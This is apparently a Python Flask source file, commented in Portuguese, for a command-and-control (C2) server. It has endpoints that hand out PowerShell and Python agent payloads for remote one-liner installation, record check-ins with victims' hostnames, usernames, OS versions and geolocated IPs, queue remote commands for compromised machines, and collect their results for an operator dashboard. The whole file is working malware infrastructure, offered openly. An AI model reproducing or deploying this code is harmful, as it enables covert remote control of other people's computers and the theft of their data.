from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_cors import CORS
from database import Database
import os
import json
import hashlib
import secrets
from datetime import datetime, timedelta
import threading
import time

app = Flask(__name__)
CORS(app)

# Configurações de segurança
SECRET_TOKEN = os.environ.get('C2_SECRET_TOKEN', secrets.token_hex(32))
ADMIN_PASSWORD = os.environ.get('C2_ADMIN_PASSWORD', 'admin123')  # MUDE ISSO!

# Banco de dados
db = Database()

# Armazenamento de comandos pendentes (em memória)
pending_commands = {}
command_results = {}

# Função para obter país do IP (simplificada)
def get_country_from_ip(ip):
    # Aqui você pode integrar com GeoIP2 ou API externa
    # Por simplicidade, retornando "Unknown"
    try:
        import requests
        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=2)
        if response.status_code == 200:
            data = response.json()
            return data.get('country', 'Unknown')
    except:
        pass
    return 'Unknown'

# Endpoint de instalação - ONE LINER (PowerShell - SEM Python!)
@app.route('/install', methods=['GET'])
def install():
    """Endpoint que retorna o código do agente PowerShell para execução remota"""
    with open('agent_payload.ps1', 'r', encoding='utf-8') as f:
        agent_code = f.read()

    # Substitui o SERVER_URL no código
    server_url = request.host_url.rstrip('/')
    agent_code = agent_code.replace('SERVER_URL_PLACEHOLDER', server_url)
    agent_code = agent_code.replace('SECRET_TOKEN_PLACEHOLDER', SECRET_TOKEN)

    return agent_code, 200, {'Content-Type': 'text/plain; charset=utf-8'}

# Endpoint de instalação Python (legado - para quem tem Python instalado)
@app.route('/install-python', methods=['GET'])
def install_python():
    """Endpoint que retorna o código do agente Python (legado)"""
    with open('agent_payload.py', 'r', encoding='utf-8') as f:
        agent_code = f.read()

    # Substitui o SERVER_URL no código
    server_url = request.host_url.rstrip('/')
    agent_code = agent_code.replace('SERVER_URL_PLACEHOLDER', server_url)
    agent_code = agent_code.replace('SECRET_TOKEN_PLACEHOLDER', SECRET_TOKEN)

    return agent_code, 200, {'Content-Type': 'text/plain; charset=utf-8'}

# Endpoint de checkin do cliente
@app.route('/api/checkin', methods=['POST'])
def checkin():
    """Cliente envia informações e recebe comandos pendentes"""
    data = request.json
    
    # Validar token
    if data.get('token') != SECRET_TOKEN:
        return jsonify({'error': 'Unauthorized'}), 401
    
    # Obter IP real do cliente
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Preparar dados do cliente
    client_data = {
        'client_id': data['client_id'],
        'ip_address': client_ip,
        'country': get_country_from_ip(client_ip),
        'hostname': data['hostname'],
        'username': data['username'],
        'os_version': data['os_version']
    }
    
    # Salvar/atualizar no banco
    db.add_or_update_client(client_data)
    db.add_log(data['client_id'], 'checkin', f"IP: {client_ip}")
    
    # Verificar se há comandos pendentes
    client_id = data['client_id']
    commands = pending_commands.get(client_id, [])
    
    # Limpar comandos pendentes
    if client_id in pending_commands:
        del pending_commands[client_id]
    
    return jsonify({
        'status': 'ok',
        'commands': commands
    })

# Endpoint para receber resultados de comandos
@app.route('/api/result', methods=['POST'])
def receive_result():
    """Cliente envia resultado de comando executado"""
    data = request.json
    
    if data.get('token') != SECRET_TOKEN:
        return jsonify({'error': 'Unauthorized'}), 401
    
    client_id = data['client_id']
    command_id = data['command_id']
    result = data['result']
    
    # Salvar resultado
    command_results[command_id] = result
    db.add_command(client_id, data.get('command', ''), result)
    
    return jsonify({'status': 'ok'})

# Dashboard Web
@app.route('/')
def dashboard():
    """Página principal do dashboard"""
    return render_template('dashboard.html')

# API para obter lista de clientes
@app.route('/api/clients', methods=['GET'])
def get_clients():
    """Retorna lista de todos os clientes"""
    # Autenticação básica (você pode melhorar isso)
    auth = request.headers.get('Authorization')
    if auth != f'Bearer {ADMIN_PASSWORD}':
        return jsonify({'error': 'Unauthorized'}), 401
    
    clients = db.get_all_clients()
    
    # Marcar como offline se não fez checkin nos últimos 5 minutos
    for client in clients:
        last_seen = datetime.fromisoformat(client['last_seen'])
        if datetime.now() - last_seen > timedelta(minutes=5):
            client['status'] = 'offline'
    
    return jsonify(clients)

# API para enviar comando para cliente
@app.route('/api/command', methods=['POST'])
def send_command():
    """Envia comando para um cliente específico"""
    auth = request.headers.get('Authorization')
    if auth != f'Bearer {ADMIN_PASSWORD}':
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.json
    client_id = data['client_id']
    command = data['command']
    
    # Adicionar comando à fila
    if client_id not in pending_commands:
        pending_commands[client_id] = []
    
    command_id = secrets.token_hex(8)
    pending_commands[client_id].append({
        'id': command_id,
        'type': command['type'],
        'params': command.get('params', {})
    })
    
    db.add_log(client_id, 'command_sent', f"Type: {command['type']}")
    
    return jsonify({'status': 'ok', 'command_id': command_id})

# API para obter logs
@app.route('/api/logs/<client_id>', methods=['GET'])
def get_logs(client_id):
    """Retorna logs de um cliente"""
    auth = request.headers.get('Authorization')
    if auth != f'Bearer {ADMIN_PASSWORD}':
        return jsonify({'error': 'Unauthorized'}), 401

    logs = db.get_logs(client_id)
    return jsonify(logs)

# API para obter resultado de comando
@app.route('/api/result/<command_id>', methods=['GET'])
def get_result(command_id):
    """Retorna resultado de um comando específico"""
    auth = request.headers.get('Authorization')
    if auth != f'Bearer {ADMIN_PASSWORD}':
        return jsonify({'error': 'Unauthorized'}), 401

    result = command_results.get(command_id)
    if result:
        return jsonify({'result': result})
    else:
        return jsonify({'result': None})

if __name__ == '__main__':
    print("=" * 60)
    print("🚀 C2 ADMIN SYSTEM - SERVIDOR INICIADO")
    print("=" * 60)
    print(f"📡 Secret Token: {SECRET_TOKEN}")
    print(f"🔑 Admin Password: {ADMIN_PASSWORD}")
    print(f"⚠️  MUDE A SENHA EM PRODUÇÃO!")
    print("=" * 60)
    
    # Criar arquivo de payload se não existir
    if not os.path.exists('agent_payload.py'):
        print("⚠️  Arquivo agent_payload.py não encontrado!")
    
    app.run(host='0.0.0.0', port=5000, debug=False)

